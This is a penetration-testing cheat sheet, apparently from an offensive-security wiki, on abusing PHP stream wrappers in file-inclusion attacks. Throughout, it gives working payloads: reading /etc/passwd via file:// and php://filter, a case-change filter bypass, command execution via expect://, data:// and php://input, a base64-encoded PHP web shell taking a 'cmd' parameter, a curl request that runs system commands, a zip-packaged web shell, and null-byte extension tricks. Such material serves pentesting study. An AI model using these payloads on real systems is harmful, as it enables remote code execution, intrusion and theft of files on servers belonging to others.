# PHP Wrappers

PHP has a number of wrappers that can often be abused to bypass various input filters.

## Cheat sheet

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers" %}

{% embed url="https://highon.coffee/blog/lfi-cheat-sheet" %}

{% hint style="success" %}
Note: Wrappers can be chained.
{% endhint %}

## Wrappers

### Wrapper file://

```bash
..?filename=file:///etc/passwd # List files.
```

### Wrapper expect://

```bash
..?filename=expect://[COMMAND]
..?filename=expect://whoami
```

The **expect** wrapper in PHP helps in the interaction with process flows. This extension is disabled by default, but can be very useful if enabled.

### Wrapper php://filter

View the content of a file in base64. This is useful for PHP files, since remember that the LFI interprets PHP code, but would not show the content. With the use of this wrapper we can see the content encoded in base64 and then decode it and see the content:

{% hint style="info" %}
The "php://filter" part is case insensitive, so we can bypass it.
{% endhint %}

```bash
php://filter/convert.base64-encode/resource=<PATH TO FILE>
php://filter/read=convert.base64-encode/resource=<PATH TO FILE>
pHp://FilTer/convert.base64-encode/resource=<PATH TO FILE> # Note the capitalization for the bypass.
php://filter/read=/resource=/etc/passwd
```

### Wrapper php://filter + zlib (compression)

It can be chained with a compression wrapper for large files:

```bash
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

To read the compression data it is necessary to decode the base64 and read the resulting data using:

```bash
php -a # Starts a php console
readfile('php://filter/zlib.inflate/resource=<FILE>');
```

### Wrapper php://filter/read=string.rot13

```bash
# View the contents of a file in a string rotated 13 times (Caesar encryption):
..?filename=php://filter/read=string.rot13/resource=<PATH TO FILE>
# To rotate it to the "normal state", we do:
echo "<STRING ROT13> | tr '[C-ZA-Bc-za-b]' '[P-ZA-Op-za-o]'"
```

### Wrapper data://

The data wrapper can be used to include external data, including PHP code. It is possible to use it only if the **allow\_url\_include** setting is enabled in the PHP configuration. This can be found in the `/etc/php/X.Y/apache2/php.ini` file for Apache and in `/etc/php/X.Y/fpm/php.ini` for php-fpm used by Nginx, where X.Y is the installed PHP version.

The following procedure must be followed:

```bash
# We encode the PHP payload in base64:
echo -n "<?php system(\$_GET['cmd']);?>" | base64
# Then we make the URL request with the base64 and the wrapper data:
...?filename=data://text/plain;base64,<BASE64>=&cmd=id

# Another way in plaintext:
...=filename=data:text/plain,<?php echo system("whoami"); ?>
# Other payloads:
filename=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?> # Get in base64, the index.php
filename=data://text/plain,<?php phpinfo(); ?>
```

### Wrapper php://input

Like the data wrapper, the input wrapper can be used to include external inputs and execute code. It also needs the **allow\_url\_include** setting enabled. The following curl command sends a POST request with a system command and then includes it using **php://input**, which is executed by the page.

```bash
curl -s -X POST --data "<?php system('id'); ?>" "<URL>?filename=php://input"
```

Another example:

![](../../../.gitbook/assets/wrapper\_input.png)

### Wrapper zip://

The zip wrapper can be useful in combination with file uploads. If the website allows uploading arbitrary files, an attacker can upload a malicious zip file and include PHP code. This wrapper is not enabled by default and can be installed with the following command: `apt install phpX.Y-zip` (X.Y would be the PHP version).

We must follow the following procedure:

```bash
# Create a malicious file:
echo -n "<?php system(\$_GET['cmd']); ?>" > exec.php
zip malicious.zip exec.php
rm exec.php
```

Next, copy **malicious.zip** to the webroot to simulate the upload (with Burpsuite we select the `Paste from file` option and select the **malicious.zip** â†’ [Paste a file (POST)](../../../general/proxies-and-pivoting/burpsuite.md#paste-a-file-post)).

The files in the zip archive can be referenced using the **#** symbol, which must be encoded as a URL in the request. For example, the URL below can be used to include exec.php and then execute the code using the cmd parameter.

```bash
<URL>?filename=zip://malicious.zip%23exec.php&cmd=id # "#" is encoded in %23 to prevent the browser from recognizing it as a fragment.
<URL>?filename=zip://malicious.zip%23exec&cmd=id # The same but without the file extension.
```

### Tips

* Sometimes, if we want to access a PHP file, we must not include the extension because it can be that behind, it is adding that extension. Example: `...?filename=file:///var/www/html/asd` (remember that it will be interpreted, but then we can use other wrappers like **php://filter** to see the content of this one).
* Make use of the null byte (**%00**) to avoid adding an extension or to interpret a file that we have uploaded. Ex: The file **shell.php.jpg** to be interpreted we do: `shell.php%00`
